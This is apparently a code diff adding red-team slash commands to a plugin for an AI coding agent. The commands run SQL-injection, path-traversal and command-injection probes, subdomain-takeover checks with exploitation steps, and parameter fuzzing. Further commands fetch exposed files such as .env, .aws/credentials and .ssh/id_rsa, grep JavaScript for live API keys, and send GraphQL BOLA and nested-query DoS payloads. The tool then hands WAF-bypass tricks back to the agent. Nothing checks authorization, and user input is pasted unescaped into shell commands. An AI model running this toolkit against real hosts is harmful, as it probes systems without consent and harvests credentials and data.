+        sqli_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?id=1' OR '1'='1" --connect-timeout 5 2>/dev/null)
+        echo "SQLi payload: HTTP $sqli_response"
+        
+        # Path traversal
+        traversal_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}/../../../etc/passwd" --connect-timeout 5 2>/dev/null)
+        echo "Path traversal: HTTP $traversal_response"
+        
+        # Command injection
+        cmd_response=$(curl -s -o /dev/null -w "%{http_code}" "${target}?cmd=;ls" --connect-timeout 5 2>/dev/null)
+        echo "Command injection: HTTP $cmd_response"
+        
+        # Check for block responses
+        [ "$xss_response" = "403" ] || [ "$sqli_response" = "403" ] && echo ""
+        [ "$xss_response" = "403" ] || [ "$sqli_response" = "403" ] && echo "⚠️ WAF likely blocking malicious requests (403 responses)"
+      `, 60);
+
+      state.toolsUsed.push("waf-detection");
+      state.scanResults["waf"] = wafw00f.output + "\n" + manual.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ WAF detection complete.", "info");
+
+      pi.sendUserMessage(
+        `## WAF Detection Results for ${target}
+
+### wafw00f Output
+\`\`\`
+${truncateOutput(wafw00f.output, 30)}
+\`\`\`
+
+### Manual Detection
+\`\`\`
+${manual.output}
+\`\`\`
+
+### Common WAF Bypass Techniques:
+
+**Cloudflare:**
+- Try finding origin IP via historical DNS, SSL certs, or error pages
+- Use \`%0d%0a\` for header injection
+
+**AWS WAF:**
+- Unicode normalization bypasses
+- Chunked encoding
+
+**Generic:**
+- Case variation: \`<ScRiPt>\`
+- URL encoding: \`%3Cscript%3E\`
+- Double encoding: \`%253Cscript%253E\`
+- Comments: \`/**/\`, \`--\`, \`#\`
+- Null bytes: \`%00\`
+- HTTP Parameter Pollution
+
+Use \`record_finding\` to document WAF presence and any bypasses found.`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // SUBDOMAIN TAKEOVER
+  // ============================================================
+
+  pi.registerCommand("takeover", {
+    description: "🎯 Subdomain Takeover - Check for vulnerable subdomains",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /takeover <domain>", "error");
+        return;
+      }
+
+      const target = args.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      ctx.ui.notify(`🎯 Checking subdomain takeover for ${target}...`, "info");
+
+      // First enumerate subdomains
+      ctx.ui.notify("Enumerating subdomains...", "info");
+      const subdomains = await execCommand(`
+        # Combine multiple sources
+        (
+          subfinder -d ${target} -silent 2>/dev/null
+          curl -s "https://crt.sh/?q=%25.${target}&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null
+        ) | sort -u | head -100
+      `, 180);
+
+      // Check each subdomain for takeover
+      ctx.ui.notify("Checking for takeover vulnerabilities...", "info");
+      const takeover = await execCommand(`
+        subdomains="${subdomains.output.replace(/\n/g, " ")}"
+        
+        echo "| Subdomain | CNAME | Status | Takeover? |"
+        echo "|-----------|-------|--------|-----------|" 
+        
+        for sub in $subdomains; do
+          [ -z "$sub" ] && continue
+          
+          # Get CNAME
+          cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1 | sed 's/\.$//')
+          
+          if [ -n "$cname" ]; then
+            # Check if CNAME resolves
+            ip=$(dig +short A "$cname" 2>/dev/null | head -1)
+            
+            # Known vulnerable patterns
+            vulnerable="No"
+            
+            # GitHub Pages
+            echo "$cname" | grep -qE "github\.io$" && [ -z "$ip" ] && vulnerable="🔴 GitHub Pages"
+            
+            # Heroku
+            echo "$cname" | grep -qE "herokuapp\.com$" && vulnerable="🟠 Check Heroku"
+            
+            # AWS S3
+            echo "$cname" | grep -qE "s3.*amazonaws\.com$" && vulnerable="🟠 Check S3"
+            
+            # Shopify
+            echo "$cname" | grep -qE "myshopify\.com$" && vulnerable="🟠 Check Shopify"
+            
+            # Azure
+            echo "$cname" | grep -qE "azurewebsites\.net$|cloudapp\.azure\.com$" && vulnerable="🟠 Check Azure"
+            
+            # Fastly
+            echo "$cname" | grep -qE "fastly\.net$" && vulnerable="🟠 Check Fastly"
+            
+            # Check HTTP response for dangling records
+            if [ "$vulnerable" = "No" ] && [ -z "$ip" ]; then
+              vulnerable="🟡 NXDOMAIN"
+            fi
+            
+            echo "| $sub | $cname | ${ip:-NXDOMAIN} | $vulnerable |"
+          fi
+        done | head -50
+      `, 300);
+
+      // Also try subjack if available
+      const subjack = await execCommand(`
+        echo "${subdomains.output}" > /tmp/subs.txt
+        subjack -w /tmp/subs.txt -t 20 -timeout 30 -ssl -c /usr/share/subjack/fingerprints.json 2>/dev/null | head -20 || echo "subjack not available"
+      `, 60);
+
+      state.toolsUsed.push("subdomain-takeover");
+      state.scanResults["takeover"] = takeover.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ Subdomain takeover check complete.", "info");
+
+      pi.sendUserMessage(
+        `## Subdomain Takeover Analysis for ${target}
+
+${takeover.output}
+
+### Subjack Results
+\`\`\`
+${subjack.output}
+\`\`\`
+
+### Takeover Indicators:
+- 🔴 **CRITICAL**: Confirmed takeover possible
+- 🟠 **MEDIUM**: CNAME to claimable service
+- 🟡 **LOW**: NXDOMAIN - investigate further
+
+### Exploitation:
+1. For GitHub Pages: Create repo with same name
+2. For Heroku: Create app with subdomain name
+3. For S3: Create bucket with same name
+4. For Azure: Create resource with same name
+
+Use \`record_finding\` for any confirmed takeovers (HIGH/CRITICAL severity).`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // PARAMETER FUZZING / DISCOVERY
+  // ============================================================
+
+  pi.registerCommand("params", {
+    description: "🔍 Parameter Discovery - Find hidden parameters",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /params <target_url>", "error");
+        return;
+      }
+
+      let target = args.trim();
+      if (!target.startsWith("http")) target = `https://${target}`;
+
+      ctx.ui.notify(`🔍 Discovering hidden parameters on ${target}...`, "info");
+
+      // Use arjun if available
+      const arjun = await execCommand(`arjun -u "${target}" -oT /tmp/arjun-params.txt -t 10 2>/dev/null && cat /tmp/arjun-params.txt || echo "arjun not available"`, 180);
+
+      // Manual parameter discovery
+      const manual = await execCommand(`
+        common_params="id user_id userid uid email username name admin debug test callback redirect url next file path cmd exec query search q s page limit offset sort order format type action method api_key key token auth apikey secret password pass passwd"
+        
+        echo "| Parameter | GET | POST | Notes |"
+        echo "|-----------|-----|------|-------|"
+        
+        for param in $common_params; do
+          # Test GET
+          get_resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${target}?$param=test123" --connect-timeout 3 2>/dev/null)
+          get_status=$(echo "$get_resp" | cut -d: -f1)
+          get_size=$(echo "$get_resp" | cut -d: -f2)
+          
+          # Test POST
+          post_resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -X POST "${target}" -d "$param=test123" --connect-timeout 3 2>/dev/null)
+          post_status=$(echo "$post_resp" | cut -d: -f1)
+          post_size=$(echo "$post_resp" | cut -d: -f2)
+          
+          # Compare with baseline (first param tested)
+          notes=""
+          [ "$get_status" = "200" ] && [ "$get_size" -gt 100 ] && notes="🟡 May accept"
+          echo "$param" | grep -qE "debug|admin|secret|password|token" && notes="⚠️ Sensitive"
+          
+          echo "| $param | $get_status ($get_size) | $post_status ($post_size) | $notes |"
+        done
+      `, 120);
+
+      state.toolsUsed.push("param-discovery");
+      state.scanResults["params"] = arjun.output + "\n" + manual.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ Parameter discovery complete.", "info");
+
+      pi.sendUserMessage(
+        `## Parameter Discovery for ${target}
+
+### Arjun Results
+\`\`\`
+${truncateOutput(arjun.output, 30)}
+\`\`\`
+
+### Common Parameters
+${manual.output}
+
+### Next Steps:
+1. Test discovered parameters for injection vulnerabilities
+2. Check \`debug\`, \`admin\`, \`test\` params for hidden functionality
+3. Test \`redirect\`, \`url\`, \`callback\` for open redirect/SSRF
+4. Test \`file\`, \`path\` for path traversal
+5. Test \`cmd\`, \`exec\` for command injection
+
+Use \`record_finding\` for any sensitive parameter exposure.`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // SECRET SCANNING
+  // ============================================================
+
+  pi.registerCommand("secrets", {
+    description: "🔑 Secret Scanning - Find exposed secrets and credentials",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /secrets <target_url_or_domain>", "error");
+        return;
+      }
+
+      const target = args.trim();
+      ctx.ui.notify(`🔑 Scanning for secrets on ${target}...`, "info");
+
+      // Scan exposed files
+      const exposed = await execCommand(`
+        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
+        base="https://$domain"
+        
+        echo "=== Exposed Files Check ==="
+        
+        sensitive_files=".env .env.local .env.production .env.development .git/config .git/HEAD .gitconfig .npmrc .dockerenv Dockerfile docker-compose.yml .aws/credentials .ssh/id_rsa id_rsa id_rsa.pub .htpasswd .htaccess web.config wp-config.php config.php settings.php database.yml secrets.yml .travis.yml .circleci/config.yml Jenkinsfile .gitlab-ci.yml package.json composer.json Gemfile requirements.txt yarn.lock package-lock.json backup.sql dump.sql database.sql db.sql .DS_Store Thumbs.db debug.log error.log access.log"
+        
+        for file in $sensitive_files; do
+          code=$(curl -s -o /dev/null -w "%{http_code}" "$base/$file" --connect-timeout 3 2>/dev/null)
+          if [ "$code" = "200" ]; then
+            size=$(curl -sI "$base/$file" 2>/dev/null | grep -i content-length | cut -d: -f2 | tr -d ' \r')
+            echo "🔴 FOUND: $file (HTTP 200, ${size:-unknown} bytes)"
+          fi
+        done
+      `, 120);
+
+      // Check JavaScript for secrets
+      const jsSecrets = await execCommand(`
+        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
+        
+        echo ""
+        echo "=== JavaScript Secret Patterns ==="
+        
+        # Download and scan main JS files
+        curl -s "https://$domain" 2>/dev/null | grep -oE 'src="[^"]+\.js[^"]*"' | cut -d'"' -f2 | head -10 | while read js; do
+          [[ "$js" =~ ^/ ]] && js="https://$domain$js"
+          [[ ! "$js" =~ ^http ]] && continue
+          
+          content=$(curl -s "$js" 2>/dev/null | head -10000)
+          
+          # Check for API keys and secrets
+          echo "$content" | grep -oE "['\"][A-Za-z0-9_-]*[Aa][Pp][Ii][_-]?[Kk][Ee][Yy]['\"]\s*[=:]\s*['\"][A-Za-z0-9_-]+['\"]" | head -3 && echo "  ↑ in $js"
+          echo "$content" | grep -oE "sk_live_[A-Za-z0-9]+" && echo "  ↑ Stripe Secret Key in $js"
+          echo "$content" | grep -oE "pk_live_[A-Za-z0-9]+" && echo "  ↑ Stripe Publishable Key in $js"
+          echo "$content" | grep -oE "AKIA[0-9A-Z]{16}" && echo "  ↑ AWS Access Key in $js"
+          echo "$content" | grep -oE "ghp_[A-Za-z0-9]{36}" && echo "  ↑ GitHub Token in $js"
+          echo "$content" | grep -oE "xox[baprs]-[A-Za-z0-9-]+" && echo "  ↑ Slack Token in $js"
+        done
+      `, 120);
+
+      // Try gitleaks if available
+      const gitleaks = await execCommand(`
+        domain="${target.replace(/^https?:\/\//, "").replace(/\/.*$/, "")}"
+        mkdir -p /tmp/secrets-scan
+        curl -s "https://$domain" > /tmp/secrets-scan/index.html 2>/dev/null
+        gitleaks detect --source /tmp/secrets-scan -v 2>/dev/null | head -30 || echo "gitleaks not available"
+      `, 60);
+
+      state.toolsUsed.push("secret-scanning");
+      state.scanResults["secrets"] = exposed.output + "\n" + jsSecrets.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ Secret scanning complete.", "info");
+
+      pi.sendUserMessage(
+        `## Secret Scanning Results for ${target}
+
+### Exposed Files
+\`\`\`
+${exposed.output}
+\`\`\`
+
+### JavaScript Secrets
+\`\`\`
+${jsSecrets.output || "No secrets found in JS files"}
+\`\`\`
+
+### Gitleaks
+\`\`\`
+${truncateOutput(gitleaks.output, 30)}
+\`\`\`
+
+### Common Secret Patterns:
+- AWS: \`AKIA[0-9A-Z]{16}\`
+- Stripe: \`sk_live_\`, \`pk_live_\`
+- GitHub: \`ghp_\`, \`gho_\`
+- Slack: \`xox[baprs]-\`
+- Google: \`AIza[0-9A-Za-z-_]{35}\`
+
+Use \`record_finding\` for any exposed secrets (CRITICAL severity for private keys/API secrets).`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // GRAPHQL TESTING
+  // ============================================================
+
+  pi.registerCommand("graphql", {
+    description: "📊 GraphQL Testing - Test GraphQL endpoint security",
+    handler: async (args, ctx) => {
+      if (!args) {
+        ctx.ui.notify("Usage: /graphql <graphql_endpoint>", "error");
+        return;
+      }
+
+      let target = args.trim();
+      if (!target.startsWith("http")) target = `https://${target}`;
+
+      ctx.ui.notify(`📊 Testing GraphQL endpoint ${target}...`, "info");
+
+      // Introspection query
+      const introspection = await execCommand(`
+        curl -s -X POST "${target}" \
+          -H "Content-Type: application/json" \
+          -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}' \
+          --connect-timeout 10 2>/dev/null | jq -r '.data.__schema.types[] | select(.fields != null) | "\(.name): \(.fields | map(.name) | join(", "))"' 2>/dev/null | head -30
+      `, 30);
+
+      // Field suggestions (error-based enumeration)
+      const suggestions = await execCommand(`
+        echo "=== Field Suggestions ==="
+        response=$(curl -s -X POST "${target}" \
+          -H "Content-Type: application/json" \
+          -d '{"query":"{__typo}"}' \
+          --connect-timeout 10 2>/dev/null)
+        echo "$response" | jq -r '.errors[].message' 2>/dev/null | head -10
+      `, 30);
+
+      // Batching attack test
+      const batching = await execCommand(`
+        echo "=== Batching Test ==="
+        response=$(curl -s -X POST "${target}" \
+          -H "Content-Type: application/json" \
+          -d '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]' \
+          --connect-timeout 10 2>/dev/null)
+        if echo "$response" | jq -e '.[0]' >/dev/null 2>&1; then
+          echo "🟠 Batching ENABLED - potential for abuse"
+          echo "$response" | jq -r '.[].data.__typename' 2>/dev/null | head -3
+        else
+          echo "✅ Batching not enabled or returns single response"
+        fi
+      `, 30);
+
+      state.toolsUsed.push("graphql-test");
+      state.scanResults["graphql"] = introspection.output + "\n" + suggestions.output + "\n" + batching.output;
+      pi.appendEntry("redteam-state", state);
+
+      ctx.ui.notify("✅ GraphQL testing complete.", "info");
+
+      pi.sendUserMessage(
+        `## GraphQL Security Testing for ${target}
+
+### Introspection Query
+\`\`\`
+${introspection.output || "Introspection disabled or failed"}
+\`\`\`
+
+### Field Suggestions
+\`\`\`
+${suggestions.output}
+\`\`\`
+
+### Batching Test
+\`\`\`
+${batching.output}
+\`\`\`
+
+### GraphQL Attack Vectors:
+1. **Introspection enabled**: Full schema disclosure (MEDIUM)
+2. **Batching enabled**: Can bypass rate limits, brute force (MEDIUM)
+3. **Nested queries**: DoS via deeply nested queries
+4. **Field suggestions**: Enum types/fields even without introspection
+5. **Authorization bypass**: Test accessing other users' data via ID
+
+### Test Queries:
+\`\`\`graphql
+# Get all users (BOLA test)
+{users{id,email,password}}
+
+# Nested query DoS
+{users{posts{comments{author{posts{comments{author}}}}}}}
+\`\`\`
+
+Use \`record_finding\` for vulnerabilities found.`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // LIST VARIANTS COMMAND
+  // ============================================================
+
+  pi.registerCommand("list-variants", {
+    description: "📝 List generated attack variants",
+    handler: async (args, ctx) => {
+      if (state.attackVariants.length === 0) {
+        ctx.ui.notify("No attack variants generated. Run /analyze first.", "info");
+        return;
+      }
+
+      const filter = args?.trim().toLowerCase();
+      let variants = state.attackVariants;
+
+      if (filter) {
+        variants = variants.filter(v => 
+          v.category.includes(filter) || 
+          v.name.toLowerCase().includes(filter) ||
+          v.severity === filter
+        );
+      }
+
+      const summary = variants.map((v, i) => 
+        `${i + 1}. ${SEVERITY_EMOJI[v.severity]} [${v.severity.toUpperCase()}] ${v.name}\n   Category: ${v.category} | Automated: ${v.automated ? "✅" : "❌"} | Tests: ${v.testCases.length}`
+      ).join("\n\n");
+
+      pi.sendUserMessage(
+        `## Attack Variants (${variants.length} total)\n\n${summary}\n\nUse \`list_attack_variants\` tool for full details including payloads.`,
+        { deliverAs: "followUp" }
+      );
+    },
+  });
+
+  // ============================================================
+  // TEST VARIANTS COMMAND
+  // ============================================================
+
+  pi.registerCommand("test-variants", {
+    description: "🧪 Run automated tests for generated variants",
+    handler: async (args, ctx) => {
+      const automatedVariants = state.attackVariants.filter(v => v.automated);
+
+      if (automatedVariants.length === 0) {
+        ctx.ui.notify("No automated variants available. Run /analyze first.", "info");
+        return;
+      }
+
+      ctx.ui.notify(`🧪 Running ${automatedVariants.length} automated tests...`, "info");
+
+      const results: string[] = [];
+
+      for (const variant of automatedVariants.slice(0, 5)) {
+        ctx.ui.notify(`Testing: ${variant.name}...`, "info");
+
+        // Run test cases based on category
+        let testResult = "";
+        
+        if (variant.category === "cors_misconfig" && state.target) {
+          const cors = await execCommand(`
+            curl -sI "https://api.${state.target}" -H "Origin: https://evil.com" 2>/dev/null | grep -i access-control
+          `, 10);
+          testResult = cors.output.includes("evil.com") ? "🔴 CORS vulnerable!" : "✅ CORS OK";
+        } else if (variant.category === "information_disclosure" && state.target) {
+          const info = await execCommand(`
+            for f in .env .git/HEAD robots.txt; do
+              code=$(curl -s -o /dev/null -w "%{http_code}" "https://${state.target}/$f" --connect-timeout 3 2>/dev/null)
+              [ "$code" = "200" ] && echo "Found: $f"
+            done
+          `, 30);
+          testResult = info.output || "✅ No sensitive files exposed";
+        } else {
+          testResult = "⏭️ Manual testing required";
+        }
+
+        results.push(`### ${variant.name}\n${testResult}`);
+      }
+
+      pi.sendUserMessage(
+        `## Automated Variant Test Results\n\n${results.join("\n\n")}\n\n---\n\nRemaining variants require manual testing. Use the payloads from \`list_attack_variants\`.`,
         { deliverAs: "followUp" }
       );
     },
